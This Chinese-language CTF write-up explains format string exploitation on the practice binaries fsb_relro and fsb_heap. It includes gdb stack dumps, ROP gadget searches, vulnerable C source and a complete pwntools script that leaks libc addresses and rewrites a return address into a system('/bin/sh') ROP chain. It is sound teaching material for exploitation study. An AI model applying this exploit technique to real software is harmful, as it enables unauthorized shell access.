### 从五个例子来理解格式化字符串漏洞（二）

### fsb_relro

checksec 看一下开了的保护
```
root@kali:~/Desktop/release# checksec fsb_relro 
[*] '/root/Desktop/release/fsb_relro'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
然后IDA载入看一下：

<img src="/images/posts/fmt2/1523782716338.png" >

发现有for循环执行echo函数，但是从这道题开的保护来看，我们可以知道这道题与上一道题的不同点在于开了RELRO保护，意味着我们不能通过改写got表来进行跳转到system函数执行了，同时这道题也是没有getshell函数，也是有一个明显的格式化字符串漏洞可以利用。

这道题思想不难，主要是找偏移，逐个点逐个点地去找。





这个是泄露出栈的地址(`0x7ffc63887030`)的时候，查看栈的情况：
怎样泄漏的呢？就是在泄露`__libc_start_main`的时候，在他的前面找了一个echo函数的ebp，因为这个地址肯定在栈上，后面就直接用该值和其他栈上的偏移量来表示其他栈上的地址就ok了。下面ret要改写的地址就是用这个方法来得到的。
```
gdb-peda$ x /30xg 0x7ffc63887030
0x7ffc63887030:	0x00000000004009a0	0x00007feffb4202e1
0x7ffc63887040:	0x0000000000040000	0x00007ffc63887118
0x7ffc63887050:	0x00000001fb5612a8	0x000000000040094f
0x7ffc63887060:	0x0000000000000000	0xe7ba5c95187a5db9
0x7ffc63887070:	0x00000000004006f0	0x00007ffc63887110
0x7ffc63887080:	0x0000000000000000	0x0000000000000000
0x7ffc63887090:	0x18429b05ebba5db9	0x1865aa910e085db9
0x7ffc638870a0:	0x0000000000000000	0x0000000000000000
0x7ffc638870b0:	0x0000000000000000	0x00007ffc63887128
0x7ffc638870c0:	0x00007feffb9c2170	0x00007feffb7ac9ab
0x7ffc638870d0:	0x0000000000000000	0x0000000000000000
0x7ffc638870e0:	0x00000000004006f0	0x00007ffc63887110
0x7ffc638870f0:	0x0000000000000000	0x0000000000400719
0x7ffc63887100:	0x00007ffc63887108	0x000000000000001c
0x7ffc63887110:	0x0000000000000001	0x00007ffc63887411
```




在echo的返回地址那里下一个断点，因为要修改返回地址。从返回地址开始修改，依次修改为`pop rdi;ret`的地址、`/bin/sh\x00`的地址和system的地址就可以getshell了。

<img src="/images/posts/fmt2/1523793909349.png" >

下好断点之后，就c继续执行停到相应位置
```
[-------------------------------------code-------------------------------------]
   0x400860 <echo+122>:	je     0x400867 <echo+129>
   0x400862 <echo+124>:	call   0x400698
   0x400867 <echo+129>:	leave  
=> 0x400868 <echo+130>:	ret    
   0x400869 <timeout>:	push   rbp
   0x40086a <timeout+1>:	mov    rbp,rsp
   0x40086d <timeout+4>:	mov    edi,0x400a40
   0x400872 <timeout+9>:	call   0x400690
[------------------------------------stack-------------------------------------]
0000| 0x7ffd79d4fba8 --> 0x400982 (<main+51>:	add    DWORD PTR [rbp-0x4],0x1)
0008| 0x7ffd79d4fbb0 --> 0x7ffd79d4fcb8 --> 0x7ffd79d50411 ("fsb_relro")
0016| 0x7ffd79d4fbb8 --> 0x1004006f0 
0024| 0x7ffd79d4fbc0 --> 0x7ffd79d4fcb0 --> 0x1 
0032| 0x7ffd79d4fbc8 --> 0x0 
0040| 0x7ffd79d4fbd0 --> 0x4009a0 (<__libc_csu_init>:	push   r15)
0048| 0x7ffd79d4fbd8 --> 0x7fbeaa69e2e1 (<__libc_start_main+241>:	mov    edi,eax)
0056| 0x7ffd79d4fbe0 --> 0x40000 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0000000000400868 in echo ()
```

当前rsp的情况：

<img src="/images/posts/fmt2/1523794716303.png" >


相应的情况如上，所以我们明确地看到程序已经运行到echo的返回地址上了，可以看到原来栈上的栈顶指针是指向`0x400982`(echo的返回地址，在main函数的地址)，因此我们需要把栈上的栈顶指针改为指向一个`pop rdi;ret`这个gadget上，然后再给rdi赋值为`/bin/sh\x00`(栈顶指针+8)，最后把system放到这个gadget的ret(栈顶指针+16)上就可以了。
并且两个值计算可以得到相差0x28
```
>>> hex(0x7ffd79d4fba8-0x7ffd79d4fbd0)
'-0x28'
```


查找gadget ：`ROPgadget --binary fsb_relro --only "pop|ret"`

```
root@kali:~/Desktop/release# ROPgadget --binary fsb_relro --only "pop|ret"
Gadgets information
============================================================
0x00000000004009fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004009fe : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400a00 : pop r14 ; pop r15 ; ret
0x0000000000400a02 : pop r15 ; ret
0x00000000004009fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004009ff : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400750 : pop rbp ; ret
0x0000000000400a03 : pop rdi ; ret
0x0000000000400a01 : pop rsi ; pop r15 ; ret
0x00000000004009fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400679 : ret

Unique gadgets found: 11
```


查找/bin/sh(因为用的是本地库，所以我就直接把本地库cp出来直接找了，但是如果是远程库，那就另当别论了)

```
root@kali:~/libc-database# ROPgadget --binary libc-2.24.so --string "/bin/sh"
Strings information
============================================================
0x00000000001619b9 : /bin/sh
```

然后后面依次改地址的方法跟前面几个题目都是一样的，就不多说了。

上脚本：
```
from pwn import *

p = process('fsb_relro') #env = {'LD_PRELOAD':'./libc.so.6'}
#libc = ELF('libc.so.6')
#elf = ELF('fsb_inf')

def s_sub(a,b):
    if a<b:
       return 0x10000 + a - b 
    return a - b 

payload = ""
payload += "%78$p.%79$p.%72$p." 

pause()

p.recv()
p.sendline(payload)
p.recvuntil(".")
libc_start_main_ret = int(p.recvuntil(".",drop = True),16)
#print hex(libc_start_main_ret)
log.info("libc_start_main_ret addr: " + hex(libc_start_main_ret))
stack_addr = int(p.recvuntil(".",drop = True),16)
log.info("stack_addr addr: " + hex(stack_addr))

pause()

libc_base = libc_start_main_ret - 0x202e1
system_addr = libc_base + 0x3f480
printf_addr = libc_base + 0x4f190
sh_addr = libc_base + 0x1619b9
log.info("system_addr addr: " + hex(system_addr))
log.info("printf_addr addr: " + hex(printf_addr))
log.info("sh_addr addr: " + hex(sh_addr))

pr_addr = 0x400a03

n = 6 + 14
pattern = "%{}c%{}$hn"

payload = ""
### pop rdi; ret

payload += pattern.format(0x0a03,n)

### "/bin/sh\x00"

sh_low = sh_addr & 0xffff
sh_mid = (sh_addr >> 16) & 0xffff
sh_high = (sh_addr >> 32) & 0xffff

payload += pattern.format(s_sub(sh_low,0x0a03),n+1)
payload += pattern.format(s_sub(sh_mid,sh_low),n+2)
payload += pattern.format(s_sub(sh_high,sh_mid),n+3)

### system

system_low = system_addr & 0xffff
system_mid = (system_addr >> 16) & 0xffff
system_high = (system_addr >> 32) & 0xffff

payload += pattern.format(s_sub(system_low,sh_high),n+4)
payload += pattern.format(s_sub(system_mid,system_low),n+5)
payload += pattern.format(s_sub(system_high,system_mid),n+6)

###padding

payload = payload.ljust(112,"A") #7*16=112

# ret -->  pop rid; ret
payload += p64(stack_addr-0x28)

# rdi --> "/bin/sh\x00"
payload += p64(stack_addr-0x28+8)
payload += p64(stack_addr-0x28+10)
payload += p64(stack_addr-0x28+12)

# system
payload +=p64(stack_addr-0x28+16)
payload +=p64(stack_addr-0x28+18)
payload +=p64(stack_addr-0x28+20)

pause()

p.sendline(payload)

p.interactive()
```

### fsb_heap
源码放上来：
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <signal.h>

void echo() {
    int size = 0x200;
    char *buf = malloc(size);
    memset(buf, 0, size);

    fgets(buf, size, stdin);
    printf(buf);
    puts("\nain't it cool, bye now");
}

void timeout() {
    puts("Time is up");
    exit(1);
}

void welcome() {
    setvbuf(stdin, 0LL, 2, 0LL);
    setvbuf(stdout, 0LL, 2, 0LL);

    char welcome[] =
        "================================================\n"
        "Welcome to the super echo-mon-better system, it \n"
        "will echo anything you said, like:\n\n"
        "Melody: I wanna a flag, mom\n"
        "Mom: I wanna a flag, mom\n"
        "================================================\n";
    puts(welcome);

    signal(SIGALRM, timeout);
    alarm(5);
}

void echo_mon_better() {
    int i = 0;
    for (i = 0; i < 100; ++i) {
        echo();
    }
    return 0;
}

int main(int argc, char const *argv[]) {
    welcome();
    echo_mon_better();
    return 0;
}

```

这道题的主要思路是利用RBP链来改返回地址为`pop rdi;ret`的地址进而getshell

```
root@kali:~/Desktop/release# ROPgadget --binary fsb_heap --only "pop|ret"
Gadgets information
============================================================
0x0000000000400a5c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400a5e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400a60 : pop r14 ; pop r15 ; ret
0x0000000000400a62 : pop r15 ; ret
0x0000000000400a5b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400a5f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004007b0 : pop rbp ; ret
0x0000000000400a63 : pop rdi ; ret
0x0000000000400a61 : pop rsi ; pop r15 ; ret
0x0000000000400a5d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400679 : ret

Unique gadgets found: 11
```


找`/bin/sh\x00`
```
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7fcaf43ce9b9 --> 0x68732f6e69622f ('/bin/sh')
gdb-peda$ xinfo 0x7fcaf43ce9b9
0x7fcaf43ce9b9 --> 0x68732f6e69622f ('/bin/sh')
Virtual memory mapping:
Start : 0x00007fcaf426d000
End   : 0x00007fcaf4400000
Offset: 0x1619b9
Perm  : r-xp
Name  : /lib/x86_64-linux-gnu/libc-2.24.so
gdb-peda$ 
```